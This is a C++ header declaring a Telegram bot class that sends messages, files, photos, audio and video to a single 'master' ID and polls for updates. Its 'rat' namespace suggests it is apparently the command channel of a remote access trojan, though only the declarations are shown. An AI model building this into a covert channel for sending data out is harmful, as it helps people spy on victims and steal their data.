#pragma once

#include <limits>
#include <nlohmann/json.hpp>
#include "rat/tbot/macros.hpp"
#include "rat/networking.hpp"
#include "rat/tbot/types.hpp"
#include "rat/tbot/aliases.hpp"



namespace rat::tbot {


using json = nlohmann::json;



class Bot {
    private:
        std::string token;
        int64_t master_id;
        int64_t last_update_id ;
        uint16_t update_interval;

        std::string sending_message_url_base;
        std::string sending_document_url;
        
        std::string sending_photo_url;
        std::string getting_file_url;
        std::string getting_update_url;
    public:
        Bot(const std::string& arg_Token, int64_t Master_Id);
        std::string getToken(void) const;
 
        void setOffset(void); //invoke it only if the bot handles the updates, if it is a sender bot do not;
        int64_t getMasterId(void) const;
    
        int64_t getLastUpdateId(void) const;
        void setUpdateIterval(uint16_t Update_Interval);
        BotResponse sendMessage(const std::string& Text_Message) const;
        BotResponse sendFile(const std::filesystem::path& File_Path) const;

        BotResponse sendPhoto(const std::filesystem::path& Photo_Path) const;
        BotResponse sendAudio(const std::filesystem::path& Audio_Path);
        BotResponse sendVideo(const std::filesystem::path& Video_Path);

        
        bool downloadFile(const std::string& File_Id, const std::filesystem::path& Out_Path) const;
        Update getUpdate();
};

} // namespace rat::tbot
